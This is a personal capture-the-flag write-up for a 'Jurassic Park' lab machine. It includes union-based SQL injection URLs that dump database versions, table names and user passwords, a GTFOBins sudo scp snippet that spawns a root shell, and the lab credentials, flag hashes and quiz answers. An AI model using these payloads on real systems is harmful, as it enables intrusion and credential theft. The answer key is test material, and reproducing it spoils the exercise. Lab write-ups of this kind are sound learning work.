# Jurassic park

## credentials
dennis:ih8dinos
(other user):D0nt3ATM3
mysql password - default? from /delete endpoitn

flag1: /home/dennis/flag1.txt
b89f2d69c56b9981ac92dd267f

flag2: /boot/grub/fonts/flagTwo.txt
96ccd6b429be8c9a4b501c7a0b117b0a

flag3: found in .bash_history
b4973bbc9053807856ec815db25fb3f1

flag4: apparently a troll. was once in /tmp, visible via .viminfo
according to walkthrough, ans is f5339ad0edbd0b0fe1262d91a475c2c4


flag5: /root/flag5.txt - found via `cat test.sh`
2a7074e491fcacc7eeba97808dc5e2ec

## points of interest
item page - sql injection
MySQL 

## Recon
### Nmap - 2 open ports:
22: ssh

80: http apache server - 2.4.18

### gobuster
shop.php
items.php
/assets
requests.txt
/delete -
```
New priv esc for Ubunut??

Change MySQL password on main system!
```
^^^ implies default mysql password, ubuntu os (we already knew that)



robots.txt - this looks to be the one from the rick and morty room? caching issue?

### jus lookin' - sql injection
item.php?id=5 - development package:
```
Dennis, why have you blocked these characters: ' # DROP - username @ ---- Is this our WAF now?
```
forcing true via sql injection:
item.php?id=6 OR 1 = 1
page w/price -1, -1 sold, description 'nope' title '...'

using one of the blocked chars in the query param gives us a permission denied 
easter egg pages


adding an OFFSET query gives us an error, saying
check the manual that corresponds to your MySQL server version
item.php?id=5 union select 1, 2, 3, 4, version() gets us server version:
ubuntu 16.04
item.php?id=5 union select 1, 2, 3, 4, (SELECT+group_concat(table_name)+from+information_schema.tables+where+table_schema=database())
^^ gets us 'items, users' so we know we have a users table

http://jurassic.park/item.php?id=5+union+select+1,+2,+3,+4,+(SELECT+group_concat(password)+from+users)
gets us D0nt3ATM3, ih8dinos

### ssh in dennis
`sudo -l` dennis can run scp as sudo
flag1 in home dir
find / -name 'flag*' finds flag2
cat bash_history shows some usage of scp to move flag5 ? fails?
other user = ben? doesn't exist in /etc/passwd?

gtfobins provides this:
`TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
sudo scp -S $TF x y:
`
gets us a root shell via sudo scp
`cat /home/dennis/viminfo` in the list we can see there was once a /tmp/flagFour.txt'
according to discord this flag is a troll? doesn't exist?
walkthrough seems to confirm. that's annoying.

`cat .bash_history` gives us flag 3 at the top

in vim, using '3 to visit the old file from /tmp/flagfour just makes a new file. no history..


## Summary!

### What is the SQL database called which  is serving the shop information?
Found this accidentally with an unsuccessful SQLi - 
`http://jurassic.park/item.php?id=5%20union%20select%201,%202,%203,%204,%20db_name()`
gives response 'FUNCTION park.db_name does not exist'
ans is:
```
park
```

### How many columns does the table have?
this one was found with successful sql injection - 
using a union select gives an error unless you have 5 columns, meaning:
```
5
```

### What is the system version?
union selecting 1, 2, 3, 4, version() gives us this answer: '5.7.25-0ubuntu0.16.04.2'
from this we can assume:
```
ubuntu 16.04
```

### What is dennis' password?
'http://jurassic.park/item.php?id=5+union+select+1,+2,+3,+4,+(SELECT+group_concat(password)+from+users)'
gives us a concatted list of all passwords - username fetch was disabled here
cheesed this a little as I couldn't get the username
just tried both as an ssh login
```
ih8dinos
```

### locate and get the first flag contents
This was just in dennis' home dir, `cat flag1.txt` got us
```
b89f2d69c56b9981ac92dd267f
```

### what's the contents of the second flag?
`find / -iname 'flag*' 2>/dev/null`
finds it in /boot/grub/fonts/flagTwo.txt and it is:
```
96ccd6b429be8c9a4b501c7a0b117b0a
```

### what's the contents of the third flag?
this was in .bash_history, `cat .bash_history`
ans:
```
b4973bbc9053807856ec815db25fb3f1
```

### What's the contents of the fourth flag?
troll? 
https://www.embeddedhacker.com/2019/09/hacking-walkthrough-thm-hackback-2019/
```
f5339ad0edbd0b0fe1262d91a475c2c4
```

### What's the contents of the fifth flag?
got root access via sudo scp exploit, flag was in /root
ans:
```
2a7074e491fcacc7eeba97808dc5e2ec
```

### thoughts
a nice room, first one i've done start->root without much assistance
a little soured at the end that flag 4 isn't real? wasted time on that

